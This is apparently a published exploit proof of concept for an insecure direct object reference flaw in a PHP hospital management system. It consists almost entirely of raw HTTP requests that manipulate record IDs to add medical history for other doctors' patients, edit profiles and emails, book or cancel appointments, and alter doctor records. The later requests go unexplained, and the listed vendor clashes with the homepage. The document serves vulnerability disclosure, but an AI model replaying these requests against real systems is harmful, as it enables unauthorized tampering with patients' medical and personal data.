# Exploit Title: Hospital Management System v4.0 - Insecure Direct Object Reference(IDOR)
## Date: 1/4/2024
## Vendor Homepage: https://phpgurukul.com/hospital-management-system-in-php
## Tested on: Debian Linux, Apache, Mysql
## Vendor: PHPNews
## Version: v4.0
## Exploit Description:
## Hospital Management System v4.0 suffers from IDOR - Broken Access Control Vulnerability allowing attacker doctor to add medical history for patient who is managed by other doctor(horizontal privilege escalation).

## -----------------------------------------------POC-------------------------------------------------------------------
```
POST /hospital/hms/doctor/view-patient.php?viewid=2(CHANGE HERE) HTTP/1.1

bp=90&bs=6.9&weight=90&temp=37&pres=AAAAA&submit=
```



POST /hospital/hms/edit-profile.php HTTP/1.1
Host: localhost:8190
Content-Length: 80
Cache-Control: max-age=0
sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="98"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "macOS"
Upgrade-Insecure-Requests: 1
Origin: http://localhost:8190
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost:8190/hospital/hms/edit-profile.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: wp-settings-time-3=1696498166; wp-settings-2=mfold%3Do%26libraryContent%3Dbrowse; wp-settings-time-2=1699523409; R_PCS=light; R_LOCALE=zh-hans; PHPSESSID=340efab67170ea61447f069017ce4e77
Connection: close

fname=user1&address=aaaaaa&city=abbb&gender=male&uemail=user2%40test.com&submit=


POST /hospital/hms/change-emaild.php HTTP/1.1
Host: localhost:8190
Content-Length: 30
Cache-Control: max-age=0
sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="98"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "macOS"
Upgrade-Insecure-Requests: 1
Origin: http://localhost:8190
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost:8190/hospital/hms/change-emaild.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: wp-settings-time-3=1696498166; wp-settings-2=mfold%3Do%26libraryContent%3Dbrowse; wp-settings-time-2=1699523409; R_PCS=light; R_LOCALE=zh-hans; PHPSESSID=340efab67170ea61447f069017ce4e77
Connection: close

email=user2%40test.com&submit=


POST /hospital/hms/book-appointment.php HTTP/1.1
Host: localhost:8190
Content-Length: 93
Cache-Control: max-age=0
sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="98"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "macOS"
Upgrade-Insecure-Requests: 1
Origin: http://localhost:8190
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost:8190/hospital/hms/book-appointment.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: wp-settings-time-3=1696498166; wp-settings-2=mfold%3Do%26libraryContent%3Dbrowse; wp-settings-time-2=1699523409; R_PCS=light; R_LOCALE=zh-hans; PHPSESSID=340efab67170ea61447f069017ce4e77
Connection: close

Doctorspecialization=Orthopedics&doctor=4&fees=0&appdate=2023-12-30&apptime=9%3A00+PM&submit=

GET /hospital/hms/appointment-history.php?id=6&cancel=update HTTP/1.1
Host: localhost:8190
sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="98"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "macOS"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost:8190/hospital/hms/appointment-history.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: wp-settings-time-3=1696498166; wp-settings-2=mfold%3Do%26libraryContent%3Dbrowse; wp-settings-time-2=1699523409; R_PCS=light; R_LOCALE=zh-hans; PHPSESSID=340efab67170ea61447f069017ce4e77
Connection: close



GET /hospital/hms/doctor/appointment-history.php?id=3&cancel=update HTTP/1.1
Host: localhost:8190
sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="98"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "macOS"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost:8190/hospital/hms/doctor/appointment-history.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: wp-settings-time-3=1696498166; wp-settings-2=mfold%3Do%26libraryContent%3Dbrowse; wp-settings-time-2=1699523409; R_PCS=light; R_LOCALE=zh-hans; PHPSESSID=340efab67170ea61447f069017ce4e77
Connection: close


POST /hospital/hms/admin/edit-doctor.php?id=4 HTTP/1.1
Host: localhost:8190
Content-Length: 132
Cache-Control: max-age=0
sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="98"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "macOS"
Upgrade-Insecure-Requests: 1
Origin: http://localhost:8190
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost:8190/hospital/hms/admin/edit-doctor.php?id=4
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: wp-settings-time-3=1696498166; wp-settings-2=mfold%3Do%26libraryContent%3Dbrowse; wp-settings-time-2=1699523409; R_PCS=light; R_LOCALE=zh-hans; PHPSESSID=340efab67170ea61447f069017ce4e77
Connection: close

Doctorspecialization=Orthopedics&docname=user1d&clinicaddress=aaaaaa&docfees=20&doccontact=123456&docemail=user1d%40test.com&submit=

